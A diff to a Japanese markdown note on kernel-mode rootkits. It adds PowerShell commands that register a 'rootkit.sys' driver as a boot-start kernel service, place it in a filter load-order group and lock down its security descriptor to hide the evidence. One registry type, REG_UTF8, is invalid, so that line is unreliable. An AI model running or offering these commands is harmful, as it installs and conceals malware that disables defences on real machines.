@@ -2,7 +2,17 @@
 自分の存在や活動をOSから完全に隠し、特権を維持し続けるためのマルウェアのこと。
 
 ## Kernel Mode Rootkit
-カーネルドライバーとして動作し、プロセス、ファイル、通信の隠蔽やアンチウィルスの無効化を行うルートキットのこと。
+カーネルドライバー`.sys`として動作し、プロセス、ファイル、通信の隠蔽やアンチウィルスの無効化を行うルートキットのこと。
+
+- カーネルドライバーの登録と設定から証拠の隠蔽まで
+```powershell
+sc.exe create MyRootkit type= kernel binPath= "C:\Windows\System32\drivers\rootkit.sys"
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\MyRootkit" /v Start /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\MyRootkit" /v Group /t REG_UTF8 /d "FSFilter Activity Monitor" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\MyRootkit" /v Tag /t REG_DWORD /d 1 /f
+# sc.exe start MyRootkit
+sc.exe sdset MyRootkit D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+```
 
 ### Step1
 DKOMによる任意のプロセスの隠蔽を行う。
